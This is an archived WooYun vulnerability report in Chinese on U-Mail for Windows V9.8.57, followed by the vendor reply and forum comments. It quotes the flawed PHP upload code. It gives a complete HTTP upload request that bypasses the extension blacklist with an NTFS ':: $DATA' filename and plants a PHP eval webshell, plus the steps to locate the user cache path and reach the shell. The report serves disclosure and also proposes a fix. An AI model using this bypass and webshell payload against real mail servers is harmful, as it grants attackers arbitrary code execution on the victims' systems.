{"id": 46039, "wybug_id": "wooyun-2014-086162", "wybug_title": "U-mail邮件系统又一getshell", "wybug_corp": "U-Mail", "wybug_author": "Ano_Tom", "wybug_date": "2014-12-06 17:33", "wybug_open_date": "2015-03-06 17:34", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-06：\t细节向公众公开  简要描述： U-mail邮件系统某处处理不当，导致getshell 详细说明：  版本：U-Mail for Windows V9.8.57测试帐号：hello0001@fuck.com测试主机：windows server 2003+IIS6 [windows主机配置都为邮件系统默认配置]首先需要获取用户的UserID，因为其缓存目录路径为 umail\\WorldClient\\html\\client\\cache\\{userid}\\获取用户id的接口为http://mail.fuck.com/webmail/client/oab/index.php?module=operate&action=member-get&page=1&orderby=&is_reverse=1&keyword=hello0001\n\n得知userid为3上传缺陷漏洞文件，umail\\WorldClient\\html\\client\\mail\\module\\o_attach.php代码\nif ( ACTION == \"attach-upload-batch\" && $_FILES ){\t\t$file_name = $_FILES['Filedata']['name'];\t\t$file_type = $_FILES['Filedata']['type'];\t\t$file_size = $_FILES['Filedata']['size'];\t\t$file_source = $_FILES['Filedata']['tmp_name'];\t\t$path_target = getusercachepath( );\t\t$not_allow_ext = array( \"php\", \"phps\", \"php3\", \"exe\", \"bat\" );\t\t$res_data = array( );\t\tforeach ( $file_source as $k => $v )\t\t{\t\t\t\t$file_id = makerandomname( );\t\t\t\t$file_suffix = getfilenamesuffix( $file_name[$k] );\t\t\t\tif ( in_array( $file_suffix, $not_allow_ext ) )\t\t\t\t{\t\t\t\t\t\t$res_data[] = array(\t\t\t\t\t\t\t\t\"status\" => \"0\",\t\t\t\t\t\t\t\t\"message\" => el( \"不支持该扩展名文件上传\", \"\" ),\t\t\t\t\t\t\t\t\"filename\" => $file_name[$k],\t\t\t\t\t\t\t\t\"filesize\" => $file_size[$k],\t\t\t\t\t\t\t\t\"file_id\" => $file_id\t\t\t\t\t\t);\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t$file_target = $path_target.$file_id.\".\".$file_suffix;\t\t\t\t\t\tif ( !move_uploaded_file( $v, $file_target ) )\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$res_data[] = array(\t\t\t\t\t\t\t\t\t\t\"status\" => \"0\",\t\t\t\t\t\t\t\t\t\t\"message\" => el( \"写入文件出错，请与管理员联系！\", \"\" ),\t\t\t\t\t\t\t\t\t\t\"filename\" => $file_name[$k],\t\t\t\t\t\t\t\t\t\t\"filesize\" => $file_size[$k],\t\t\t\t\t\t\t\t\t\t\"file_id\" => $file_id\t\t\t\t\t\t\t\t);\t\t\t\t\t\t}\t\t\t\t\t\telse\t\t\t\t\t\t{\t\t\t\t\t\t\t\t$res_data[] = array(\t\t\t\t\t\t\t\t\t\t\"status\" => \"1\",\t\t\t\t\t\t\t\t\t\t\"filename\" => trim( $file_name[$k] ),\t\t\t\t\t\t\t\t\t\t\"filesize\" => $file_size[$k],\t\t\t\t\t\t\t\t\t\t\"file_id\" => $file_id\t\t\t\t\t\t\t\t);\t\t\t\t\t\t\t\t$_SESSION[SESSION_ID]['attach_cache'][] = array(\t\t\t\t\t\t\t\t\t\t\"id\" => $file_id,\t\t\t\t\t\t\t\t\t\t\"name\" => $file_name[$k],\t\t\t\t\t\t\t\t\t\t\"type\" => \"1\",\t\t\t\t\t\t\t\t\t\t\"path\" => $file_target,\t\t\t\t\t\t\t\t\t\t\"size\" => $file_size[$k]\t\t\t\t\t\t\t\t);\t\t\t\t\t\t}\t\t\t\t}\t\t}\t\tdump_json( $res_data );}\n之前版本允许传php文件，最新版采用了黑名单机制，不允许传php文件，无法绕过其后缀检测。但是利用NTFS的ADS特性，可以绕过其黑名单机制，如图发送邮件，选择拖拽添加附件，burpsuite拦截包，修改文件名为s.php::$DATA即可绕过，如图\nPOST /webmail/client/mail/index.php?module=operate&action=attach-upload-batch HTTP/1.1Host: mail.fuck.comProxy-Connection: keep-aliveContent-Length: 233Origin: http://mail.fuck.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundary37jD3r27mTgTBrAhAccept: */*Referer: http://mail.fuck.com/webmail/client/mail/index.php?module=view&action=mail-composeAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=3b8305453c65c1039f33832b23268fff------WebKitFormBoundary37jD3r27mTgTBrAhContent-Disposition: form-data; name=\"Filedata[]\"; filename=\"s.php::$DATA\"Content-Type: application/octet-stream<?php @eval($_POST['a']);?>------WebKitFormBoundary37jD3r27mTgTBrAh--\n\n\n则获得的webshell地址为 http://mail.fuck.com/webmail/client/cache/3/14178435495.php\n\n   漏洞证明：  如上   修复方案：  由于该邮件系统采用的IIS+Fastcgi模式跑的php，且为windows主机，会面临很多问题，比如解析漏洞等等。而针对该系统上传产生的问题，最简单的修复方案就是将上传的文件目录统一放在非web目录   版权声明：转载请注明来源 Ano_Tom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-12-11 08:23 厂商回复： cnvd确认并复现所述情况，由cnvd按以往建立的联系渠道向软件生产厂商邮件通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-06 17:41 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:134        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  .........    \n     2014-12-11 09:26 |    \t\tMetasploit \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:7        | http://www.metasploit.cn/)\t\t \n  以后没人敢用了,就不消停    \n     2014-12-11 10:30 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  为何我发的就要忽略，感觉不会再爱了    \n     2014-12-12 16:31 |    \t\twinalva \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | rank是什么？)\t\t \n  好屌    \n     2015-01-23 10:59 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:48        | 国家一级保护动物)\t\t \n  这个和之前的原理一样阿， WooYun: Umail最新版漏洞大礼包（完结篇） ，上传黑名单绕过。    \n     2015-01-23 11:06 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:37        | Talk is cheap.:)\t\t \n  @pandas 不一样，我那时测试你这个getshell已经绕不过的了，修复了黑名单了的，得用文件流    \n     2015-01-23 12:15 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:48        | 国家一级保护动物)\t\t \n  @Ano_Tom 哦哦，那看来是修补了，有空我看下补丁    \n     2015-03-06 23:05 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:25        | 我读书少，你可别骗我！！！)\t\t \n  NTFS的ADS特性 学习了！！    \n     2015-04-23 01:09 |    \t\tArthur \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:32        | USA，I am coming！！！！！)\t\t \n  审计牛，为什么php::$DATA就绕过了？    \n     2015-04-23 21:23 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:37        | Talk is cheap.:)\t\t \n  @Arthur 嗯，这是结合windows的ADS流文件特性(http://zone.wooyun.org/content/1064)，你提交这种类型的文件名时候就绕过了他那个黑名单检测    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}